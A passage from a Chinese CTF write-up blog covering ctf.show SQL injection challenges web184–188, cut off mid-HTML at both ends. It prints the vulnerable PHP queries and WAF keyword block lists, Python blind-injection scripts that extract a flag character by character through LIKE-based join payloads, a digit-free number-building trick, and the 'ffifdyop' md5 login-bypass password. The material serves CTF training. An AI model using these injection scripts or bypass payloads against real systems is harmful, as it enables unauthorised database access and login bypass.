style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://0a468011-1fcc-4f74-9d14-60b1e6e62b39.challenge.ctf.show/select-waf.php&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin">str</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;0123456789abcdef{}-_&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ctfshow&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> j </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        res </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> str_to_hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">j</span><span class="token operator" style="color:#393A34">+</span><span class="token string" style="color:#e3116c">&#x27;%&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&quot;tableName&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">res</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;$user_count = 43&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> j</span><span class="token operator" style="color:#393A34">==</span><span class="token string" style="color:#e3116c">&quot;}&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web185">web185<a href="#web185" class="hash-link" aria-label="Direct link to web185" title="Direct link to web185">​</a></h3>
<p>过滤的有点多</p>
<p>查询语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//拼接sql语句查找指定ID用户</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;select count(*) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//对传入的参数进行了过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  function waf($str){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>[0-9]没了,但是y4爹爹贴了一张图</p>
<p><img decoding="async" loading="lazy" src="https://img-blog.csdnimg.cn/20201127190309995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" class="img_ev3q"></p>
<p>哇 实在是太神奇了，y4爹爹的意思就是用这些来构造出数字！</p>
<p>用concat()将字母拼接起来，用法是concat(&#x27;ab&#x27;,&#x27;cd) ---&gt; abcd</p>
<p>只需要修改一下刚刚的脚本就可以了！</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">str_to_num</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">n</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;true+&#x27;</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">n</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">concat_str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    res </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> s</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        res </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;chr(&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> str_to_num</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">ord</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;),&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> res</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://a84c9ee8-467b-4b3d-be95-5336dd5611c1.challenge.ctf.show/select-waf.php&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin">str</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;0123456789abcdef{}-_&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ctfshow&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> j </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        res </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> concat_str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">j</span><span class="token operator" style="color:#393A34">+</span><span class="token string" style="color:#e3116c">&#x27;%&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&quot;tableName&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like (concat(</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">res</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">))&quot;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;$user_count = 43&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> j</span><span class="token operator" style="color:#393A34">==</span><span class="token string" style="color:#e3116c">&quot;}&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web186">web186<a href="#web186" class="hash-link" aria-label="Direct link to web186" title="Direct link to web186">​</a></h3>
<p>过滤的有亿点点多</p>
<p>查询语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//拼接sql语句查找指定ID用户</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;select count(*) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//对传入的参数进行了过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  function waf($str){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>诶，上一道题的脚本还是可以用</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web187">web187<a href="#web187" class="hash-link" aria-label="Direct link to web187" title="Direct link to web187">​</a></h3>
<p>这题，常客了啊</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    $username = $_POST[&#x27;username&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $password = md5($_POST[&#x27;password&#x27;],true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    //只有admin可以获得flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if($username!=&#x27;admin&#x27;){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $ret[&#x27;msg&#x27;]=&#x27;用户名不存在&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>md5之后注入进去，常客ffifdyop。</p>
<p>username=admin password=ffifdyop</p>
<p>具体解释就是ffifdyop在md5之后的值是276f722736c95d99e921722cf9ed621c，而这串进行hex之后&#x27;or&#x27;6É].é!r,ùíb.</p>
<p>你看这个&#x27;or&#x27;是不是很注入</p>
<div class="language-knowledge codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-knowledge codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">————————————————</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">版权声明：本文为CSDN博主「bfengj」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">原文链接：https://blog.csdn.net/rfrder/article/details/113664639</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>所以相当于万能密码</p>
<p><img decoding="async" loading="lazy" alt="image-20220109124325645" src="/assets/images/image-20220109124325645-29e8b7a2b06c8f6ede33e47fa69a3a9f.png" width="1762" height="273" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web188">web188<a href="#web188" class="hash-link" aria-label="Direct link to web188" title="Direct link to web188">​</a></h3>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> //用户名检测</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(preg_match(&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;, $username)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //密码检测</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if(!is_numeric($password)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(json_encode($ret));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  //密码判断</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  if($row[&#x27;pass&#x27;]==intval($password)){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      array_push($ret[&#x27;data&#x27;], array(&#x27;flag&#x27;=&gt;$flag));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>查询语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //拼接sql语句查找指定ID用户</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;select pass from ctfshow_user where username = {$username}&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg 